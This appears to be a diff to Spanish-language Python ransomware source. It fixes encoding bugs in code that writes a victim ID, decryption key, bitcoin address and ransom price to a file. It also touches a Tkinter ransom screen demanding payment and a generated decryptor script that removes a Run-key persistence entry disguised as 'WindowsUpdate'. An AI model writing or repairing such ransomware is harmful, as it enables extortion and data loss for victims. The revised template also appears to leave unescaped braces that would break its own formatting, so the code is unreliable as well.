@@ -315,12 +315,12 @@ que recibirá después del pago.
 
         # Guardar credenciales localmente (solo para el desarrollador)
         try:
-            with open('CLAVE_MAESTRA.txt', 'w') as f:
-                f.write(f"=== CLAVE MAESTRA (SOLO DESARROLLADOR) ===\\n")
-                f.write(f"ID: {self.victim_id}\\n")
-                f.write(f"CLAVE DE DESCIFRADO: {self.password}\\n")
-                f.write(f"BITCOIN: {self.bitcoin}\\n")
-                f.write(f"PRECIO: ${self.price}\\n")
+            with open('CLAVE_MAESTRA.txt', 'w', encoding='utf-8') as f:
+                f.write(f"=== CLAVE MAESTRA (SOLO DESARROLLADOR) ===\n")
+                f.write(f"ID: {self.victim_id}\n")
+                f.write(f"CLAVE DE DESCIFRADO: {self.password}\n")
+                f.write(f"BITCOIN: {self.bitcoin}\n")
+                f.write(f"PRECIO: ${self.price}\n")
             print("[+] Clave maestra guardada en CLAVE_MAESTRA.txt")
         except:
             pass
@@ -362,7 +362,7 @@ que recibirá después del pago.
             # Mensaje
             message_label = tk.Label(
                 main_frame,
-                text="Todos tus archivos han sido cifrados.\\nPara recuperarlos debes pagar el rescate.",
+                text="Todos tus archivos han sido cifrados.\nPara recuperarlos debes pagar el rescate.",
                 font=("Arial", 16),
                 fg="white",
                 bg="black"
@@ -459,13 +459,14 @@ Ingrese la clave de descifrado:
     def start_decryption(self):
         """Inicia el proceso de descifrado"""
         try:
-            decrypt_script = f'''
+            # Script de descifrado CORREGIDO con encoding UTF-8
+            decrypt_script = '''# -*- coding: utf-8 -*-
 import os
 import winreg
 import subprocess
 
-VICTIM_ID = "{self.victim_id}"
-PASSWORD = "{self.password}"
+VICTIM_ID = "{victim_id}"
+PASSWORD = "{password}"
 
 def simple_decrypt(data, key):
     """Descifrado simple XOR con la clave"""
@@ -477,7 +478,7 @@ def simple_decrypt(data, key):
 
 def main():
     print("Iniciando descifrado de archivos...")
-    print(f"ID Víctima: {{VICTIM_ID}}")
+    print(f"ID Victima: {VICTIM_ID}")
     
     # Descifrar archivos
     encrypted_files = []
@@ -505,17 +506,17 @@ def main():
             os.remove(enc_file)
             
             success_count += 1
-            print(f"[+] Recuperado: {{os.path.basename(original_file)}}")
+            print(f"[+] Recuperado: {os.path.basename(original_file)}")
             
         except Exception as e:
-            print(f"[-] Error con {{os.path.basename(enc_file)}}: {{e}}")
+            print(f"[-] Error con {os.path.basename(enc_file)}: {e}")
     
     # Remover persistencia
-    print("\\\\n[*] Removiendo persistencia...")
+    print("\\n[*] Removiendo persistencia...")
     try:
         # Registro
         key = winreg.HKEY_CURRENT_USER
-        subkey = r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
+        subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
         with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
             try:
                 winreg.DeleteValue(reg_key, "WindowsUpdate")
@@ -543,20 +544,21 @@ def main():
         for file in files_to_remove:
             if os.path.exists(file):
                 os.remove(file)
-                print(f"[+] Archivo {{file}} removido")
+                print(f"[+] Archivo {file} removido")
                 
     except Exception as e:
-        print(f"[-] Error removiendo persistencia: {{e}}")
+        print(f"[-] Error removiendo persistencia: {e}")
     
-    print(f"\\\\n[+] PROCESO COMPLETADO!")
-    print(f"[*] Archivos recuperados: {{success_count}}/{{len(encrypted_files)}}")
-    print("\\\\n[+] Sistema completamente recuperado!")
+    print(f"\\n[+] PROCESO COMPLETADO!")
+    print(f"[*] Archivos recuperados: {success_count}/{len(encrypted_files)}")
+    print("\\n[+] Sistema completamente recuperado!")
     input("Presione Enter para salir...")
 
 if __name__ == "__main__":
     main()
-'''
-            with open('DECRYPT_FILES.py', 'w') as f:
+'''.format(victim_id=self.victim_id, password=self.password)
+
+            with open('DECRYPT_FILES.py', 'w', encoding='utf-8') as f:
                 f.write(decrypt_script)
                 
             print("[+] Ejecutando descifrado...")
